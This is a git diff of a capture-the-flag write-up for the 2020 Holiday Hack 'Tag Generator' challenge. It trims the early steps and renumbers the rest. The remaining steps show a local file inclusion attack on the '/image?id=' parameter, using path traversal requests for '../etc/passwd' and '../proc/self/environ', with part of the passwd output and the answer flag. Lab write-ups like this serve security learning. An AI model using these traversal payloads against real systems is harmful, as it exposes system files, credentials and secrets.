@@ -286,21 +286,8 @@ Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in th
 
 **Answer:** "JackFrostWasHere"
 
-- Step 1: Get an error by doing and upload of an unsupported file:
-~~~
-Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201217-1-d0s4xy.txt
-~~~
 
-- Step 2: Check for file inclusion vulns
-
-- Step 3: Try a large image from holidayhack
-~~~
-ERROR
-413 Request Entity Too Large
-nginx/1.19.5
-~~~
-
-- Step 4: This is interesting in the /js/app.js file.
+- Step 1: This is interesting in the /js/app.js file.
 	- Looks like **"/image?id="** might be succeptible to LFI.
 
 ~~~
@@ -320,7 +307,7 @@ nginx/1.19.5
                     opacity: 1
 ~~~ 
 
-- Step 5: Didn't think I was getting anything with this, but I just needed to view the reponse in Burp.	
+- Step 2: Didn't think I was getting anything with this, but I just needed to view the reponse in Burp.	
 
 ~~~
 https://tag-generator.kringlecastle.com/image?id=../etc/passwd
@@ -351,7 +338,7 @@ app:x:1000:1000:,,,:/home/app:/bin/bash
 
 ~~~
  
-- Step 6: Do websearch for how to get environment variables through LFI. Then try this request...in Burp:
+- Step 3: Do websearch for how to get environment variables through LFI. Then try this request...in Burp:
 
 ~~~
 GET /image?id=../proc/self/environ HTTP/1.1
